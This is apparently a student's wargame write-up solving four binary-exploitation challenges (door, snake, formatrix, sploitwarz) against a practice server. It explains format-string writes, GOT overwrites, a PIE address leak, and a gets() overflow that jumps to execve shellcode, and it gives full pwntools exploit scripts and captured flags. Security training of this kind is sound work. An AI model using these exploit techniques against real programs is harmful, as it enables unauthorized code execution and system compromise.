door
=========================== 
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNC1kb29yIiwiaXAiOiIyMjAuMjQwLjgyLjk2Iiwic2Vzc2lvbiI6IjA0YjhlOGQ1LWUxZjctNDlhMi05ZjE3LTFjMTYzYWFmOGNkYiJ9.4SKeZXOpsPIMQ-wJxOXCgzDcPJbNM1wAuYEdm9OWogQ}
 
General overview of problems faced 
------------------------------------- 
The program gives you the address of a buffer that currently holds the value '9447', as well as another buffer than we can input a format string into. So we want to use this to alter the value stored in the buffer such that it passes a call to strncmp and then takes us to the win function.

To first determine the position of our buffer we are writing into, I inputted: ABBBB %x %x %x %x which gave the following output: ABBBB 41000000 42424242 20782520 25207825

As seen above, we added added an 'A' to the start of the payload so that our input 'BBBB' is aligned properly. After this, we can see it is in the second 4 byte segment, so using %2$n writes to this.

Hence, if our payload consists of a single 'A', followed by the other buffer address and then '%2$n', it overwrites the other buffer with the value 5, as this is the length of our payload before the '%2$n' (being 1 byte for 'A' + 4 bytes for address).

Now, instead of loading 5 into the other buffer, we want to load APES, as using binary ninja shows strncmp is called on our buffer and the string 'APES'. To do this, we will construct our payload one character at a time (or one byte at a time).

For 'A', we can use 'man ascii' in the terminal to view an ascii table and see that the character 'A' corresponds to the value 65. Hence, since we already have 5 bytes loaded in, we want to add 65 - 5 = 60 bytes to this first address. Since this is only the first byte, we want to use '%2hhn' to only write a single byte.

For 'P', the corresponding decimal value is 80. Hence, we update the payload by adding the address 1 byte after the start of the buffer (and make sure to update the previous %60x input to be 4 less because of adding this new address, making it 56 now), then adding 15 bytes and writing to the third 4 byte segment on the stack (which is the second byte of the buffer)

If we want to write our third character 'E', we now have a problem, as the decimal value for this is 69, but we have already written 80 bytes. However, this can easily be solved as if we write over 255 bytes, it will simply overflow back to 0. Hence, if 'E' has decimal value 69, then we want to add 256 - 80 + 69 = 245. So, like before we add the third address to the start of the payload (subtracting 4 from %56x again to make it %52x), and then add %245x bytes and writing to the fourth 4 byte segment on the stack.

For the final character 'S', this has decimal value 83, so we want to add the address offset to the payload, update the %52x to be 4 less (%48x), and then add 83 - 69 = 14 bytes with %14x, writing this to the fifth 4 byte segment on the stack.

Once this payload is constructed, I can send it as input into the function, which passess the strncmp call and enters the win function, giving me shell access.

------------------ 
``` 
p = remote("plsdonthaq.me", 4001)

# First we extract the address of the buffer given to us
p.recvuntil("blocked the way at ")
landslide = int(p.recvline()[:-1], 0)

# Here we construct the format string payload. It begins with a single 'A' character
# to align our buffer to a 4 byte interval. Then, we add 4 addresses into the buffer,
# which we will end up writing to as our buffer will be the next thing on the stack.
# Then for each character we simply find the decimal value and each this many bytes
# to our payload, and then call %n to write however many bytes we've already printed
# to the next address on the stack.
format_str = (
	b"A" + 
  p32(landslide) + p32(landslide + 1) + p32(landslide + 2) + p32(landslide + 3) +
  b"%48x" + b"%2$hhn" + 
  b"%15x" + b"%3$hhn" +
  b"%245x" + b"%4$hhn" +
  b"%14x" + b"%5$hhn"
)

# We then send this format string as input
p.sendline(format_str)

# Now we should have shell access, so we can retrieve the flag
p.interactive() 
```

snake
=========================== 
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNC1zbmFrZSIsImlwIjoiMjIwLjI0MC44Mi45NiIsInNlc3Npb24iOiJkMjA5ZDM4ZS0yNTg0LTQ2OTItODQzMS05YmZjYWQ5Y2M5MmYifQ.EATdG3L2W6RKYp93487YBq2cogXsSOsybpHezqAB4-E}
 
General overview of problems faced 
------------------------------------- 
When starting the program, we are given several options to select. Option 3 asks for a password as input, and it says that if you enter the correct password it will display the flag. However, if we actually look at the binary ninja assembly, we can see it simply checks the length of my input, and if it is more than 0x50 (or 80) characters, it prints some address on the stack.
 
To determine what this address is, we again look in binary ninja, and can see it is the start of the buffer that takes in your option selected. For example, if selecting option 3 when prompted and then printing the contents of the address using x 0xffffce90 in gdb, it contains the value 3.

Also, option 1 asks us to input our name into a buffer, yet using binary ninja we can see this uses gets, so we can overflow it. Hence, since we have a buffer we can overflow and an address on the stack, we can create a payload to jump to this address and then execute shellcode to pop a shell.

To begin, we want to determine the offsets of the return address and the stack address. Using gdb, we can use cyclic 300 and input this into the buffer. Then, when attempting to return it displays 'Invalid address 0x616f6161'. Using cyclic -l 0x616f6161, it gives 54, meaning the return address is at an offset of 54 bytes from the start of the buffer. To determine the offset of the stack address, since we know it is 0xffffce90 from earlier (and gdb turns off ASLR so it will remain the same), we can simply do cyclic -l 0x61706261, which gives 158.

Hence, our payload will have the stack address at offset 54, and our shellcode at offset 158. This will overwrite the return address of our function, instead jumping to the shellcode and executing it to pop a shell.

------------------ 
``` 
p = remote("plsdonthaq.me", 4002)

# We first select option 3 and send 80 bytes so it passes the condition and
# prints the stack address
p.sendline("3")
p.sendline(b"A"*80)

# We then extract this address printed
p.recvuntil("offset ")
stackAddress = int(p.recvline()[:-1], 0)

# Then we select option 1 so we can input our payload into the buffer
p.sendline("1")

# This is the shellcode to pop a shell
shellcode = asm("""
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
mov ecx, eax
mov edx, eax
mov al, SYS_execve
int 0x80
""")

# Finally we send our payload, which consists of the stack address at offset 54,
# and the shellcode at offest 158, with anything being placed in the other positions 
p.sendline(flat({
  54: p32(stackAddress),
  158:shellcode
  }))

# We will now have shell access, using cat flag to print the flag
p.interactive()
```

formatrix
=========================== 
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNC1mb3JtYXRyaXgiLCJpcCI6IjIyMC4yNDAuODIuOTYiLCJzZXNzaW9uIjoiYjFjNjgwODAtYzZhMy00ZWUyLWJhMTYtMDhjNzU3NWExM2M1In0.uBw-t6Dfji_-MjmkQ46sL4604DYnhSf_Mq1NGS_LOkk}
 
General overview of problems faced 
------------------------------------- 
This program allows us to input a format string and it will print it. Doing AAAA %x %x %x shows that our buffer's content 41414141 is at the third 4 bytes offset. Hence, if we input AAAA %3$x this prints the start of our buffer.

Looking in binary ninja, we can see there is a win function which gives us shell access, so it is clear we want to jump to this. In the main function, after fgets is called for our input, and then sprintf to display our input, there is a call to puts. Hence, we can overwrite the address of the puts function in the GOT so that it calls the win function instead. However, what I failed to realise was that the win function calls puts itself, so it won't work correctly once puts is overwritten. So, we can see after the call to puts in main there is also a call to printf, and since the win function doesn't use printf, we are safe to overwrite it in the GOT.

In binary ninja, the address of the win function is 0x8048536. When loading the program in gdb, we can use the command 'got' to view the GOT addresses (also note there is no RELRO protection enabled). From this, we can see the address 0x8049c18 holds the address of the printf function. We can also use objdump -d challenges/./formatrix to find the addresses for GOT entries and the win function.

Hence, in our format string we want to overwrite the address 0x8049c18 to instead point to the address 0x8048536, which contains the win function. When placing the address of the win function into our payload, since the system is little endian, we input it in little endian format, putting the least significant byte first.

To create our payload, we do it a single byte at a time. 

First byte: At 16 (4 + 4 + 4 + 4), need 0x36 = 54
Hence we write 54 - 16 = 38 bytes.

Second byte: At 54, need 0x85 = 133
Hence we write 133 - 54 = 79 bytes.

Third byte: At 133, need 0x04 = 4
Hence we write 256 - 133 + 4 = 127 bytes.

Fourth byte: At 4, need 0x08 = 8
Hence we write 8 - 4 = 4 bytes.
However, this doesn't seem to overwrite it correctly, so instead I overflow it and
then add 4, making the payload length 256 + 4 = 260.

------------------ 
``` 
p = remote("plsdonthaq.me", 4003)

# Since the protections are disabled, we can simply hardcode the address for both
# the GOT entry for printf, and the address of the win function.
printfGOT = 0x8049c18
win = 0x8048536

# Our format string then consists of the 4 address offsets that we are going to write
# to, and then for each byte of the win function's address, we get the decimal value
# and add that many bytes to the payload, using %n to write this amount to the address
format_str = (
  p32(printfGOT) + p32(printfGOT + 1) + p32(printfGOT + 2) + p32(printfGOT + 3) +
  b"%38x" + b"%3$hhn" +
  b"%79x" + b"%4$hhn" +
  b"%127x" + b"%5$hhn" +
  b"%260x" + b"%6$hhn"
)

# We then send the format string as input
p.sendline(format_str)

# And once entered the win function, we have access to a shell to get the flag
p.interactive()
```

sploitwarz
=========================== 
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNC1zcGxvaXR3YXJ6IiwiaXAiOiIyMjAuMjQwLjgyLjk2Iiwic2Vzc2lvbiI6IjM3NWU5MWY4LTFhZDAtNDYwMC05MzgyLWE0ZjI3ZWQ5ZWY4NCJ9.jMMA5JTRduygwrv6ieUveVhPk5AVNMxzsCGMqe-rSmc}
 
General overview of problems faced 
------------------------------------- 
Looking in binary ninja, there is a win function at 0xab4. However, if we run gdb with the program and use the command checksec, it shows PIE is enabled (we can also use the gdb command pie to determine the offest being used). Hence, since the win function is in the text/code region, its address will change each time we run, so we can't hardcode the address into our script. Instead, we need to leak an address, and then access the win function relative to this address.

When running the program, there are many different functions that can be called. To try and find a format string vulnerability, I tried entering the string AAAA.%p.%p.%p.%p.%p as input for my name (note I did a '.' rather than a space so it doesn't strip the %p's from my name), and then looked for a call to printf that would display this format string. 

I eventually found this in the gamble function, which if you gamble correctly prints your name with a vulnerable printf, displaying AAAA.0x565ee734.0x100.0x565ec56d.0xff8c3140.0x41414141. Hence, if we look at the first 4 byte segment, this is an address in the text/code region, so we have now leaked an address we can use to create our offsets. Also note our input AAAA is held in offset 5 as 41414141, so we know where our buffer is stored.
 
To jump to the win function, we need to overwrite the address of another function that is called. When looking at do_gamble in binary ninja, we can see after this printf call, the next function call is puts. However, the win function also uses puts, so we can't overwrite this. The next is getchar, so we will attempt to overwrite this.

To find the address of getchar stored in the GOT, we can attach our script to gdb and command got, which displays the address 0x565c252c holds the address for getchar (in this instance). We can than compare this to the leaked address 0x565c2734, and calculating 0x565c2734 - 0x565c252c = 520, so we now know the offset from the leaked address to the getchar entry in the GOT is 520.

Hence, we are going to want to create a payload which overwrites the address 520 bytes before the leaked address with the address of the win function, which using 'x win' in gdb is at 0x565bfab4 (in this instance), giving an offset of 0x565c2734 - 0x565bfab4 = 11392 from the leaked address.

------------------ 
``` 
p = remote("plsdonthaq.me", 4004)

# When the program asks us for our name, we input our first payload such that it
# will print the first 5 addresses on the stack.
p.sendline(b"AAAA.%p.%p.%p.%p.%p")

# Next, to get printf to be called with this payload we just sent, we need to gamble
# successfully. To do so, we enter a loop where we bet the minimum amount and keep
# going until our bet was correct.
while True:
  p.sendline("g")
  p.sendline("0.001")
  p.sendline("1")
  
  p.recvuntil("5)")
  p.recvlines(2)
  gamble = p.recvline()

  p.sendline("")

  if gamble[:5] != b"Wrong":
    break

# After a successful bet, it calls printf with our format string payload, so we can
# extract the leaked address from the output.
address = int(gamble[16:26], 0)

# Given this leaked address, we calculate the address of the GOT's getchar entry, as
# well as the address of the win function using offsets found earlier.
getcharGOT = address - 520
win = address - 11392

# Since the address of the win function changes each time we run, we cannot hardcode
# into the payload. Hence, we want to first extract each byte segment from it. Also
# since the system is little endian, we are going to write them with the least
# significant byte first. We also need to add the 0x to the front of the string so
# python treats it as an address. Finally we convert these addresses to their decimal
# values so we can use it in our payload.
win1 = int('0x' + str(hex(win))[8:10], 0)
win2 = int('0x' + str(hex(win))[6:8], 0)
win3 = int('0x' + str(hex(win))[4:6], 0)
win4 = int('0x' + str(hex(win))[2:4], 0)

# We then create a helper function which given a byte we want to write and the number
# of bytes we have already written, returns how many bytes we want to write next.
def getBytes(byte, current):
  # If we have already written more bytes than the next value we want to insert,
  # we need to utilise the overflow to get the correct value.
  if byte < current:
    byte = 256 - current + byte
  # Otherwise we just determine the offset required to reach our desired value.
  else:
    byte = byte - current
  return byte

# We then call this helper function for all four byte segments, and convert it into
# a string surrounded by the %x format.
win1amount = "%" + str(getBytes(win1, 16)) + "x"
win2amount = "%" + str(getBytes(win2, win1)) + "x"
win3amount = "%" + str(getBytes(win3, win2)) + "x"
win4amount = "%" + str(getBytes(win4, win3)) + "x"

# Now we simply need to construct our payload, which consists of the four addresses
# we want to write our byte values to, followed by our %x calls constructed earlier
# (note we have to use .encode() to ensure it is of type byte not string).
format_str = (
  p32(getcharGOT) + p32(getcharGOT + 1) + p32(getcharGOT + 2) + p32(getcharGOT + 3) +
  win1amount.encode() + b"%5$hhn" +
  win2amount.encode() + b"%6$hhn" +
  win3amount.encode() + b"%7$hhn" +
  win4amount.encode() + b"%8$hhn"
)

# To input this payload, we then call option c to change our name.
p.sendline("c")
p.sendline(format_str)

# Once our name is updated with the format string payload, we need to successfuly
# gamble again so printf is called on it.
while True:
  p.sendline("g")
  p.sendline("0.001")
  p.sendline("1")

  p.recvuntil("5)")
  p.recvlines(2)
  gamble = p.recvline()

  p.sendline("")

  if gamble[:5] != b"Wrong":
    break

# We should now jump to the win function and have shell access.
p.interactive()
```
